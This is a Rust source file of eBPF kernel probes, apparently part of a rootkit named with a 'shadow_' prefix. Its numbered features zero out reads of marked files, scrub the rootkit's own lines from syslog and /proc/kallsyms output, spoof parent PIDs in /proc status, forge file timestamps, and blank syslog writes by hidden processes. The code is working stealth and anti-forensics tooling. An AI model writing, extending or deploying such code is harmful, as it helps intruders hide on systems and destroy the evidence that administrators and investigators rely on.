use aya_ebpf::{
    helpers::{bpf_get_current_pid_tgid, bpf_ktime_get_ns, bpf_probe_read_kernel},
    macros::{kprobe, kretprobe},
    programs::{ProbeContext, RetProbeContext},
};
use common::{
    EventHeader, EVENT_ANCESTRY_SPOOFED, EVENT_FILE_OBFUSCATED, EVENT_KALLSYMS_HIDDEN,
    EVENT_LOG_TAMPERED, EVENT_SYSLOG_STRIPPED, EVENT_TELEMETRY_MUTED, EVENT_TIMESTOMPED,
};

use crate::maps::*;
use crate::{
    DENTRY_D_INODE_OFFSET, FILE_F_INODE_OFFSET, INODE_I_INO_OFFSET, KSTAT_ATIME_OFFSET,
    KSTAT_CTIME_OFFSET, KSTAT_MTIME_OFFSET, PATH_DENTRY_OFFSET,
};

// ──────────────────────────────────────────────
// FEATURE 3: File Obfuscation (vfs_read)
// ──────────────────────────────────────────────

#[kprobe]
pub fn shadow_vfs_read(ctx: ProbeContext) -> u32 {
    try_shadow_vfs_read(&ctx).unwrap_or_default()
}

fn try_shadow_vfs_read(ctx: &ProbeContext) -> Result<u32, i64> {
    let file_ptr: u64 = ctx.arg(0).ok_or(1i64)?;
    let buf_ptr: u64 = ctx.arg(1).ok_or(2i64)?;
    let count: u64 = ctx.arg(2).ok_or(3i64)?;

    let tgid = (bpf_get_current_pid_tgid() >> 32) as u32;
    if let Some(config) = unsafe { CONFIG.get(&0u32) } {
        if tgid == config.self_pid {
            return Ok(0);
        }
    }

    let f_inode_ptr: u64 =
        match unsafe { bpf_probe_read_kernel((file_ptr + FILE_F_INODE_OFFSET) as *const u64) } {
            Ok(v) => v,
            Err(_) => return Ok(0),
        };

    if f_inode_ptr == 0 {
        return Ok(0);
    }

    let i_ino: u64 =
        match unsafe { bpf_probe_read_kernel((f_inode_ptr + INODE_I_INO_OFFSET) as *const u64) } {
            Ok(v) => v,
            Err(_) => return Ok(0),
        };

    let marker = unsafe { OBFUSCATE_INODES.get(&i_ino) };
    if marker.is_none() {
        let pid_tgid = bpf_get_current_pid_tgid();
        let _ = VFS_READ_ARGS.insert(
            &pid_tgid,
            &VfsReadCtx {
                buf_ptr,
                inode: i_ino,
                count,
            },
            0,
        );
        return Ok(0);
    }

    let pid_tgid = bpf_get_current_pid_tgid();
    let _ = VFS_READ_ARGS.insert(
        &pid_tgid,
        &VfsReadCtx {
            buf_ptr,
            inode: i_ino,
            count,
        },
        0,
    );

    let marker_val = *marker.unwrap();

    if marker_val == 2 {
        return Ok(0);
    }

    let zero_len = if count > 256 { 256u32 } else { count as u32 };
    let zeros: [u8; 256] = [0u8; 256];
    unsafe {
        let _ = aya_ebpf::helpers::gen::bpf_probe_write_user(
            buf_ptr as *mut core::ffi::c_void,
            zeros.as_ptr() as *const core::ffi::c_void,
            zero_len,
        );
    }

    let event = EventHeader {
        event_type: EVENT_FILE_OBFUSCATED,
        pid: tgid,
        timestamp_ns: unsafe { bpf_ktime_get_ns() },
        context: i_ino,
    };
    EVENTS.output(ctx, &event, 0);

    Ok(0)
}

// ──────────────────────────────────────────────
// FEATURE 4: Telemetry Muting
// ──────────────────────────────────────────────

#[kprobe]
pub fn shadow_mute_audit(ctx: ProbeContext) -> u32 {
    try_mute_audit(&ctx).unwrap_or_default()
}

fn try_mute_audit(_ctx: &ProbeContext) -> Result<u32, i64> {
    let tgid = (bpf_get_current_pid_tgid() >> 32) as u32;

    if unsafe { HIDDEN_PIDS.get(&tgid).is_none() } {
        return Ok(0);
    }

    let event = EventHeader {
        event_type: EVENT_TELEMETRY_MUTED,
        pid: tgid,
        timestamp_ns: unsafe { bpf_ktime_get_ns() },
        context: 1,
    };
    EVENTS.output(_ctx, &event, 0);

    Ok(0)
}

#[kprobe]
pub fn shadow_mute_audit_log_end(ctx: ProbeContext) -> u32 {
    try_mute_audit_log_end(&ctx).unwrap_or_default()
}

fn try_mute_audit_log_end(_ctx: &ProbeContext) -> Result<u32, i64> {
    let tgid = (bpf_get_current_pid_tgid() >> 32) as u32;

    if unsafe { HIDDEN_PIDS.get(&tgid).is_none() } {
        return Ok(0);
    }

    let ab_ptr: u64 = _ctx.arg(0).ok_or(1i64)?;
    if ab_ptr == 0 {
        return Ok(0);
    }

    let skb_ptr: u64 = match unsafe { bpf_probe_read_kernel(ab_ptr as *const u64) } {
        Ok(v) => v,
        Err(_) => return Ok(0),
    };

    if skb_ptr == 0 {
        return Ok(0);
    }

    Ok(0)
}

// ──────────────────────────────────────────────
// FEATURE 7: Log Tampering (do_syslog)
// ──────────────────────────────────────────────

#[kprobe]
pub fn shadow_tamper_logs_enter(ctx: ProbeContext) -> u32 {
    let syslog_type: u32 = match ctx.arg(0) {
        Some(v) => v,
        None => return 0,
    };
    if syslog_type != 2 && syslog_type != 3 {
        return 0;
    }
    let buf_ptr: u64 = match ctx.arg(1) {
        Some(v) => v,
        None => return 0,
    };
    let len: u64 = match ctx.arg(2) {
        Some(v) => v,
        None => return 0,
    };
    let pid_tgid = bpf_get_current_pid_tgid();
    let entry = SyslogCtx {
        syslog_type,
        _pad: 0,
        buf_ptr,
        len,
    };
    let _ = SYSLOG_ARGS.insert(&pid_tgid, &entry, 0);
    0
}

#[kretprobe]
pub fn shadow_tamper_logs(ctx: RetProbeContext) -> u32 {
    try_tamper_logs(&ctx).unwrap_or_default()
}

fn try_tamper_logs(_ctx: &RetProbeContext) -> Result<u32, i64> {
    let pid_tgid = bpf_get_current_pid_tgid();

    let args = match unsafe { SYSLOG_ARGS.get(&pid_tgid) } {
        Some(a) => *a,
        None => return Ok(0),
    };
    let _ = SYSLOG_ARGS.remove(&pid_tgid);

    if args.buf_ptr == 0 || args.len == 0 {
        return Ok(0);
    }

    let scan_len = if args.len > 2048 {
        2048usize
    } else {
        args.len as usize
    };

    let buf = unsafe {
        let ptr = SCRATCH_BUF.get_ptr_mut(0).ok_or(1i64)?;
        &mut *ptr
    };

    unsafe {
        if aya_ebpf::helpers::gen::bpf_probe_read_user(
            buf.data.as_mut_ptr() as *mut core::ffi::c_void,
            scan_len as u32,
            args.buf_ptr as *const core::ffi::c_void,
        ) < 0
        {
            return Ok(0);
        }
    }

    let pattern: [u8; 7] = *b"shadow_";

    let mut i = 0usize;
    let max_scan = scan_len.saturating_sub(7);

    while i < max_scan {
        if i >= 2041 {
            break;
        }

        if buf.data[i] == pattern[0]
            && buf.data[i + 1] == pattern[1]
            && buf.data[i + 2] == pattern[2]
            && buf.data[i + 3] == pattern[3]
            && buf.data[i + 4] == pattern[4]
            && buf.data[i + 5] == pattern[5]
            && buf.data[i + 6] == pattern[6]
        {
            let mut line_start = i;
            while line_start > 0 && buf.data[line_start - 1] != b'\n' {
                line_start -= 1;
                if line_start == 0 {
                    break;
                }
            }

            let mut line_end = i + 7;
            while line_end < scan_len && buf.data[line_end] != b'\n' {
                line_end += 1;
                if line_end >= 2048 {
                    break;
                }
            }

            let mut j = line_start;
            while j < line_end && j < 2048 {
                buf.data[j] = b' ';
                j += 1;
            }

            let write_len = (line_end - line_start) as u32;
            if write_len > 0 && write_len < 2048 {
                unsafe {
                    let _ = aya_ebpf::helpers::gen::bpf_probe_write_user(
                        (args.buf_ptr + line_start as u64) as *mut core::ffi::c_void,
                        buf.data[line_start..].as_ptr() as *const core::ffi::c_void,
                        write_len,
                    );
                }
            }

            i = line_end + 1;
        } else {
            i += 1;
        }
    }

    let event = EventHeader {
        event_type: EVENT_LOG_TAMPERED,
        pid: (pid_tgid >> 32) as u32,
        timestamp_ns: unsafe { bpf_ktime_get_ns() },
        context: scan_len as u64,
    };
    EVENTS.output(_ctx, &event, 0);

    Ok(0)
}

// ──────────────────────────────────────────────
// FEATURE 8: Process Ancestry Spoofing
// ──────────────────────────────────────────────

#[kretprobe]
pub fn shadow_spoof_ancestry(ctx: RetProbeContext) -> u32 {
    try_spoof_ancestry(&ctx).unwrap_or_default()
}

fn try_spoof_ancestry(_ctx: &RetProbeContext) -> Result<u32, i64> {
    let pid_tgid = bpf_get_current_pid_tgid();

    let args = match unsafe { VFS_READ_ARGS.get(&pid_tgid) } {
        Some(a) => *a,
        None => return Ok(0),
    };

    if args.buf_ptr == 0 {
        return Ok(0);
    }

    let scan_len = if args.count > 512 {
        512usize
    } else {
        args.count as usize
    };

    let buf = unsafe {
        let ptr = SCRATCH_BUF.get_ptr_mut(0).ok_or(1i64)?;
        &mut *ptr
    };

    unsafe {
        if aya_ebpf::helpers::gen::bpf_probe_read_user(
            buf.data.as_mut_ptr() as *mut core::ffi::c_void,
            scan_len as u32,
            args.buf_ptr as *const core::ffi::c_void,
        ) < 0
        {
            return Ok(0);
        }
    }

    let ppid_pattern: [u8; 6] = *b"PPid:\t";

    let max_scan = scan_len.saturating_sub(6);
    let mut ppid_offset: usize = 0;
    let mut found = false;

    let mut i = 0usize;
    while i < max_scan {
        if i >= 506 {
            break;
        }
        if buf.data[i] == ppid_pattern[0]
            && buf.data[i + 1] == ppid_pattern[1]
            && buf.data[i + 2] == ppid_pattern[2]
            && buf.data[i + 3] == ppid_pattern[3]
            && buf.data[i + 4] == ppid_pattern[4]
            && buf.data[i + 5] == ppid_pattern[5]
        {
            ppid_offset = i + 6;
            found = true;
            break;
        }
        i += 1;
    }

    if !found {
        return Ok(0);
    }

    let pid_pattern: [u8; 5] = *b"Pid:\t";
    let mut target_pid: u32 = 0;
    let mut j = 0usize;
    while j < max_scan {
        if j >= 507 {
            break;
        }
        if buf.data[j] == pid_pattern[0]
            && buf.data[j + 1] == pid_pattern[1]
            && buf.data[j + 2] == pid_pattern[2]
            && buf.data[j + 3] == pid_pattern[3]
            && buf.data[j + 4] == pid_pattern[4]
            && (j == 0 || buf.data[j - 1] == b'\n' || buf.data[j - 1] == b'\t')
        {
            let mut k = j + 5;
            while k < scan_len && k < 512 && buf.data[k] >= b'0' && buf.data[k] <= b'9' {
                target_pid = target_pid * 10 + (buf.data[k] - b'0') as u32;
                k += 1;
            }
            break;
        }
        j += 1;
    }

    if target_pid == 0 {
        return Ok(0);
    }

    let fake_ppid = match unsafe { SPOOFED_PPIDS.get(&target_pid) } {
        Some(ppid) => *ppid,
        None => return Ok(0),
    };

    let mut ppid_str: [u8; 10] = [b' '; 10];
    let mut ppid_val = fake_ppid;
    let mut digit_count = 0usize;

    let mut tmp = if ppid_val == 0 { 1u32 } else { ppid_val };
    while tmp > 0 {
        digit_count += 1;
        tmp /= 10;
    }

    let mut pos = digit_count;
    if ppid_val == 0 {
        ppid_str[0] = b'0';
    } else {
        while ppid_val > 0 && pos > 0 {
            pos -= 1;
            ppid_str[pos] = b'0' + (ppid_val % 10) as u8;
            ppid_val /= 10;
        }
    }

    let mut orig_len = 0usize;
    let mut m = ppid_offset;
    while m < scan_len && m < 512 && buf.data[m] >= b'0' && buf.data[m] <= b'9' {
        orig_len += 1;
        m += 1;
    }

    let write_len = if orig_len > digit_count {
        orig_len
    } else {
        digit_count
    };
    if write_len > 0 && write_len <= 10 && ppid_offset + write_len <= 512 {
        let mut overwrite: [u8; 10] = [b' '; 10];
        let mut n = 0usize;
        while n < digit_count && n < 10 {
            overwrite[n] = ppid_str[n];
            n += 1;
        }

        unsafe {
            let _ = aya_ebpf::helpers::gen::bpf_probe_write_user(
                (args.buf_ptr + ppid_offset as u64) as *mut core::ffi::c_void,
                overwrite.as_ptr() as *const core::ffi::c_void,
                write_len as u32,
            );
        }
    }

    let event = EventHeader {
        event_type: EVENT_ANCESTRY_SPOOFED,
        pid: target_pid,
        timestamp_ns: unsafe { bpf_ktime_get_ns() },
        context: fake_ppid as u64,
    };
    EVENTS.output(_ctx, &event, 0);

    Ok(0)
}

// ──────────────────────────────────────────────
// FEATURE 10: Kallsyms Hiding (vfs_read on /proc/kallsyms)
// ──────────────────────────────────────────────

#[kretprobe]
pub fn shadow_hide_kallsyms(ctx: RetProbeContext) -> u32 {
    try_hide_kallsyms(&ctx).unwrap_or_default()
}

fn try_hide_kallsyms(_ctx: &RetProbeContext) -> Result<u32, i64> {
    let pid_tgid = bpf_get_current_pid_tgid();

    let args = match unsafe { VFS_READ_ARGS.get(&pid_tgid) } {
        Some(a) => *a,
        None => return Ok(0),
    };

    if args.buf_ptr == 0 {
        return Ok(0);
    }

    let marker = match unsafe { OBFUSCATE_INODES.get(&args.inode) } {
        Some(m) => *m,
        None => return Ok(0),
    };
    if marker != 2 {
        return Ok(0);
    }

    let scan_len = if args.count > 4096 {
        4096usize
    } else {
        args.count as usize
    };

    let buf = unsafe {
        let ptr = SCRATCH_BUF.get_ptr_mut(0).ok_or(1i64)?;
        &mut *ptr
    };

    unsafe {
        if aya_ebpf::helpers::gen::bpf_probe_read_user(
            buf.data.as_mut_ptr() as *mut core::ffi::c_void,
            scan_len as u32,
            args.buf_ptr as *const core::ffi::c_void,
        ) < 0
        {
            return Ok(0);
        }
    }

    let pattern: [u8; 7] = *b"shadow_";
    let max_scan = scan_len.saturating_sub(7);

    let mut i = 0usize;
    let mut modified = false;

    while i < max_scan {
        if i >= 4089 {
            break;
        }

        if buf.data[i] == pattern[0]
            && buf.data[i + 1] == pattern[1]
            && buf.data[i + 2] == pattern[2]
            && buf.data[i + 3] == pattern[3]
            && buf.data[i + 4] == pattern[4]
            && buf.data[i + 5] == pattern[5]
            && buf.data[i + 6] == pattern[6]
        {
            let mut line_start = i;
            while line_start > 0 && buf.data[line_start - 1] != b'\n' {
                line_start -= 1;
                if line_start == 0 {
                    break;
                }
            }

            let mut line_end = i + 7;
            while line_end < scan_len && line_end < 4096 && buf.data[line_end] != b'\n' {
                line_end += 1;
            }

            let mut k = line_start;
            while k < line_end && k < 4096 {
                buf.data[k] = b' ';
                k += 1;
            }

            modified = true;
            i = line_end + 1;
        } else {
            i += 1;
        }
    }

    if modified {
        let write_len = if scan_len > 4096 {
            4096u32
        } else {
            scan_len as u32
        };
        unsafe {
            let _ = aya_ebpf::helpers::gen::bpf_probe_write_user(
                args.buf_ptr as *mut core::ffi::c_void,
                buf.data.as_ptr() as *const core::ffi::c_void,
                write_len,
            );
        }

        let event = EventHeader {
            event_type: EVENT_KALLSYMS_HIDDEN,
            pid: (pid_tgid >> 32) as u32,
            timestamp_ns: unsafe { bpf_ktime_get_ns() },
            context: args.inode,
        };
        EVENTS.output(_ctx, &event, 0);
    }

    Ok(0)
}

// ──────────────────────────────────────────────
// FEATURE 13: Timestomping (vfs_statx / vfs_getattr)
// ──────────────────────────────────────────────

#[kprobe]
pub fn shadow_timestomp_enter(ctx: ProbeContext) -> u32 {
    let path_ptr: u64 = match ctx.arg(0) {
        Some(v) => v,
        None => return 0,
    };
    let kstat_ptr: u64 = match ctx.arg(1) {
        Some(v) => v,
        None => return 0,
    };

    if kstat_ptr == 0 || path_ptr == 0 {
        return 0;
    }

    let dentry_ptr: u64 =
        match unsafe { bpf_probe_read_kernel((path_ptr + PATH_DENTRY_OFFSET) as *const u64) } {
            Ok(v) => v,
            Err(_) => return 0,
        };

    if dentry_ptr == 0 {
        return 0;
    }

    let inode_ptr: u64 = match unsafe {
        bpf_probe_read_kernel((dentry_ptr + DENTRY_D_INODE_OFFSET) as *const u64)
    } {
        Ok(v) => v,
        Err(_) => return 0,
    };

    if inode_ptr == 0 {
        return 0;
    }

    let i_ino: u64 =
        match unsafe { bpf_probe_read_kernel((inode_ptr + INODE_I_INO_OFFSET) as *const u64) } {
            Ok(v) => v,
            Err(_) => return 0,
        };

    if unsafe { TIMESTOMP_INODES.get(&i_ino).is_none() } {
        return 0;
    }

    let pid_tgid = bpf_get_current_pid_tgid();
    let entry = GetattrCtx {
        kstat_ptr,
        inode: i_ino,
    };
    let _ = GETATTR_ARGS.insert(&pid_tgid, &entry, 0);
    0
}

#[kretprobe]
pub fn shadow_timestomp(ctx: RetProbeContext) -> u32 {
    try_timestomp(&ctx).unwrap_or_default()
}

fn try_timestomp(_ctx: &RetProbeContext) -> Result<u32, i64> {
    let pid_tgid = bpf_get_current_pid_tgid();

    let args = match unsafe { GETATTR_ARGS.get(&pid_tgid) } {
        Some(a) => *a,
        None => return Ok(0),
    };
    let _ = GETATTR_ARGS.remove(&pid_tgid);

    if args.kstat_ptr == 0 {
        return Ok(0);
    }

    let entry = match unsafe { TIMESTOMP_INODES.get(&args.inode) } {
        Some(e) => *e,
        None => return Ok(0),
    };

    let zero_nsec: i64 = 0;

    unsafe {
        let _ = aya_ebpf::helpers::gen::bpf_probe_write_user(
            (args.kstat_ptr + KSTAT_ATIME_OFFSET) as *mut core::ffi::c_void,
            &entry.fake_atime_sec as *const u64 as *const core::ffi::c_void,
            8,
        );
        let _ = aya_ebpf::helpers::gen::bpf_probe_write_user(
            (args.kstat_ptr + KSTAT_ATIME_OFFSET + 8) as *mut core::ffi::c_void,
            &zero_nsec as *const i64 as *const core::ffi::c_void,
            8,
        );
    }

    unsafe {
        let _ = aya_ebpf::helpers::gen::bpf_probe_write_user(
            (args.kstat_ptr + KSTAT_MTIME_OFFSET) as *mut core::ffi::c_void,
            &entry.fake_mtime_sec as *const u64 as *const core::ffi::c_void,
            8,
        );
        let _ = aya_ebpf::helpers::gen::bpf_probe_write_user(
            (args.kstat_ptr + KSTAT_MTIME_OFFSET + 8) as *mut core::ffi::c_void,
            &zero_nsec as *const i64 as *const core::ffi::c_void,
            8,
        );
    }

    unsafe {
        let _ = aya_ebpf::helpers::gen::bpf_probe_write_user(
            (args.kstat_ptr + KSTAT_CTIME_OFFSET) as *mut core::ffi::c_void,
            &entry.fake_ctime_sec as *const u64 as *const core::ffi::c_void,
            8,
        );
        let _ = aya_ebpf::helpers::gen::bpf_probe_write_user(
            (args.kstat_ptr + KSTAT_CTIME_OFFSET + 8) as *mut core::ffi::c_void,
            &zero_nsec as *const i64 as *const core::ffi::c_void,
            8,
        );
    }

    let event = EventHeader {
        event_type: EVENT_TIMESTOMPED,
        pid: (pid_tgid >> 32) as u32,
        timestamp_ns: unsafe { bpf_ktime_get_ns() },
        context: args.inode,
    };
    EVENTS.output(_ctx, &event, 0);

    Ok(0)
}

// ──────────────────────────────────────────────
// FEATURE 18: Syslog Write Stripping
// ──────────────────────────────────────────────

#[kprobe]
pub fn shadow_syslog_write(ctx: ProbeContext) -> u32 {
    try_syslog_write(&ctx).unwrap_or_default()
}

fn try_syslog_write(ctx: &ProbeContext) -> Result<u32, i64> {
    if let Some(flag) = unsafe { WIPE_FLAG.get(0) } {
        if *flag != 0 {
            return Ok(0);
        }
    }

    let pid_tgid = bpf_get_current_pid_tgid();
    let pid = (pid_tgid >> 32) as u32;

    let key: u32 = 0;
    if let Some(cfg) = unsafe { CONFIG.get(&key) } {
        if cfg.self_pid == pid {
            return Ok(0);
        }
    }

    let fd: u64 = unsafe { ctx.arg(0).ok_or(1i64)? };

    if unsafe { SYSLOG_FD_INODES.get(&fd) }.is_none() {
        return Ok(0);
    }

    let buf_ptr: u64 = unsafe { ctx.arg(1).ok_or(1i64)? };
    let count: u64 = unsafe { ctx.arg(2).ok_or(1i64)? };

    if count == 0 || count > 4096 {
        return Ok(0);
    }

    let scratch = unsafe { SCRATCH_BUF.get_ptr_mut(0).ok_or(1i64)? };
    let scratch_ref = unsafe { &mut *scratch };

    let read_len = if count < 4096 { count as u32 } else { 4096u32 };
    unsafe {
        if aya_ebpf::helpers::gen::bpf_probe_read_user(
            scratch_ref.data.as_mut_ptr() as *mut core::ffi::c_void,
            read_len,
            buf_ptr as *const core::ffi::c_void,
        ) < 0
        {
            return Ok(0);
        }
    }

    let mut found = false;
    for hidden_pid_key in 0..64u32 {
        if unsafe { HIDDEN_PIDS.get(&hidden_pid_key) }.is_some() {
            found = true;
            break;
        }
    }

    if !found {
        return Ok(0);
    }

    let zeros: [u8; 64] = [0u8; 64];
    let zero_len = if read_len < 64 { read_len } else { 64 };
    unsafe {
        let _ = aya_ebpf::helpers::gen::bpf_probe_write_user(
            buf_ptr as *mut core::ffi::c_void,
            zeros.as_ptr() as *const core::ffi::c_void,
            zero_len,
        );
    }

    let event = EventHeader {
        event_type: EVENT_SYSLOG_STRIPPED,
        pid,
        timestamp_ns: unsafe { bpf_ktime_get_ns() },
        context: fd,
    };
    EVENTS.output(ctx, &event, 0);

    Ok(0)
}
